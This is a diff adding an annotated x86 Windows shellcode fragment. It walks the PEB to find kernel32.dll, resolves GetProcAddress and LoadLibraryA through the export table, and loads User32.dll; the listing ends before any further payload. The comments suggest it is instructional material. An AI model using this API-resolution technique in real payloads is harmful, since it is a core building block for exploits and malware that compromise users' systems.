@@ -1,0 +1,49 @@
+
+   0:  31 c0                   xor    %eax,%eax            // EAX = 0
+   1:  64 8b 60 08             mov    %fs:0x8(%eax),%esp   // Move Segment:Offset(base) to ESP
+   2:  8d 2c 24                lea    (%esp),%ebp          // Load effective address specified by ESP to EBP (Creates virtual stack)
+   3:  31 c0                   xor    %eax,%eax            // EAX = 0
+   4:  64 8b 58 30             mov    %fs:0x30(%eax),%ebx  // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
+   5:  8b 5b 0c                mov    0xc(%ebx),%ebx       // EBX = PEB_LDR_DATA // Using offset 0xc
+   6: 8b 5b 14                 mov    0x14(%ebx),%ebx      // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
+   7: 8b 1b                    mov    (%ebx),%ebx          // EBX = Second list entry (ntdll.dll)
+   8: 8b 1b                    mov    (%ebx),%ebx          // EBX = Third list entry (kernel32.dll)
+   9: 8b 5b 10                 mov    0x10(%ebx),%ebx      // EBX = Base address of kernel32.dll // Using offset 0x10
+   10: 8b 53 3c                mov    0x3c(%ebx),%edx      // EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
+   11: 01 da                   add    %ebx,%edx            // EDX = Address of PE signature = base address + RVA of PE signature
+   12: 8b 52 78                mov    0x78(%edx),%edx      // EDX = RVA of Export Table = Address of PE + offset 0x78
+   13: 01 da                   add    %ebx,%edx            // EDX = Address of Export Table = base address + RVA of export table
+   14: 8b 72 20                mov    0x20(%edx),%esi      // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
+   15: 01 de                   add    %ebx,%esi            // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
+   16: 31 c9                   xor    %ecx,%ecx            // ECX = 0
+ 
+loopSearch:
+   17: 41                      inc    %ecx                  // Increment counter ECX
+   18: ad                      lods   %ds:(%esi),%eax       // Load next list entry into EAX
+   19: 01 d8                   add    %ebx,%eax             // EAX = Address of Entry = base address + Address of Entry
+   20: 81 38 47 65 74 50       cmpl   $0x50746547,(%eax)    // Compare first byte to GetP
+   21: 75 f4                   jne    loopSearch            // Start over if not equal
+   22: 81 78 04 72 6f 63 41    cmpl   $0x41636f72,0x4(%eax) // Compare second byte to rocA
+   23: 75 eb                   jne    loopSearch            // Start over if not equal
+   24: 8b 7a 24                mov    0x24(%edx),%edi       // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
+   25: 01 df                   add    %ebx,%edi             // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
+   26: 66 8b 0c 4f             mov    (%edi,%ecx,2),%cx     // CX = Number of Function = Address of Ordinal Table + Counter * 2
+   27: 49                      dec    %ecx                  // Decrement ECX (As name ordinals starts from 0)
+   28: 8b 7a 1c                mov    0x1c(%edx),%edi       // EDI = Offset address table
+   29: 01 df                   add    %ebx,%edi             // EDI = Offset address table
+   30: 8b 3c 8f                mov    (%edi,%ecx,4),%edi    // EDI = Pointer(Offset)
+   31: 01 df                   add    %ebx,%edi             // EDI = getProcAddress
+   32: 31 c9                   xor    %ecx,%ecx             // ECX = 0
+   33: 51                      push   %ecx                  // Push ECX onto stack
+   34: 68 61 72 79 41          push   $0x41797261           //
+   35: 68 4c 69 62 72          push   $0x7262694c           // AyrarbiLdaoL
+   36: 68 4c 6f 61 64          push   $0x64616f4c           //
+   37: 54                      push   %esp                  // "LoadLibraryA"
+   38: 53                      push   %ebx                  // "Kernel32.dll"
+   39: ff d7                   call   *%edi                 // GetProcAddress(Kernel32.dll,LoadLibraryA)
+   40: 68 6c 6c 61 61          push   $0x61616c6c           // aall
+   41: 66 81 6c 24 02 61 61    subw   $0x6161,0x2(%esp)     // Remove additional characters "aa"
+   42: 68 33 32 2e 64          push   $0x642e3233           // d.32
+   43: 68 55 73 65 72          push   $0x72657355           // resU
+   44: 54                      push   %esp                  // User32.dll
+   45: ff d0                   call   *%eax                 // Call LoadLibrary(User32.dll)
